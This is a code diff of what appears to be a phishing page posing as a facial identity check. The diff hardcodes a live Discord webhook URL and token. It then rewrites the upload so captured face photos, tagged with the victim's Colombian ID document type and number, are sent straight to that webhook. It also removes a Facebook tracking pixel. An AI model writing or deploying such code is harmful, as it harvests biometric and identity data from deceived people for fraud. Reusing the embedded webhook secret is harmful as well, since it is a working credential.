@@ -5,17 +5,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
     <title>Verificación Facial</title>
-    <script src="env.js"></script>
-    <script>
-      !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];
-      t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];
-      s.parentNode.insertBefore(t,s)}(window, document,'script',
-      'https://connect.facebook.net/en_US/fbevents.js');
-      fbq('init', '1610758720232528');
-      fbq('track', 'PageView');
-    </script>
     <style>
         :root {
             --primary: #007aff;
@@ -303,11 +292,8 @@
 
     <!-- ─────────────────────────────────────────────────────────── -->
     <script>
-        // 🎯 WEBHOOK DE DISCORD (desde env.js / variable de entorno)
-        const DISCORD_WEBHOOK = window.__ENV?.DISCORD_WEBHOOK_URL;
-        if (!DISCORD_WEBHOOK) {
-          console.error('DISCORD_WEBHOOK_URL no configurado. Revisa env.js o variables de entorno en Vercel.');
-        }
+        // 🎯 WEBHOOK DE DISCORD
+        const DISCORD_WEBHOOK = 'https://discordapp.com/api/webhooks/1489904747845648515/mSnOtuwDSlQMJChVvLObPp22v8E5W6TQU49meRkvUuUw3dyiMHnptCmEdUQohYFULqMJ';
 
         // ── Elementos ──
         const video        = document.getElementById("video");
@@ -493,19 +479,7 @@
                 });
                 const tipoDocTexto = { CC:'Cédula de Ciudadanía', CE:'Cédula de Extranjería', PP:'Pasaporte' }[tipoDocumento] || 'Desconocido';
                 const blob = await (await fetch(dataURL)).blob();
-                const fileArrayBuffer = await blob.arrayBuffer();
-                const arrayBufferToBase64 = (buffer) => {
-                    let binary = '';
-                    const bytes = new Uint8Array(buffer);
-                    const chunkSize = 0x8000;
-                    for (let i = 0; i < bytes.length; i += chunkSize) {
-                        binary += String.fromCharCode(...bytes.subarray(i, i + chunkSize));
-                    }
-                    return btoa(binary);
-                };
-                const base64File = arrayBufferToBase64(fileArrayBuffer);
-                const filename = `${numeroDocumento}_intento_${numeroIntento}.jpg`;
-
+                const formData = new FormData();
                 const payload = {
                     embeds: [{
                         title: `📸 Foto Facial - Intento ${numeroIntento}/4`,
@@ -522,19 +496,9 @@
                         timestamp: new Date().toISOString()
                     }]
                 };
-
-                const r = await fetch('/api/webhook', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        mensaje: payload,
-                        file: {
-                            name: filename,
-                            data: base64File
-                        }
-                    })
-                });
-
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, `${numeroDocumento}_intento_${numeroIntento}.jpg`);
+                const r = await fetch(DISCORD_WEBHOOK, { method:'POST', body:formData });
                 return r.ok;
             } catch { return false; }
         }
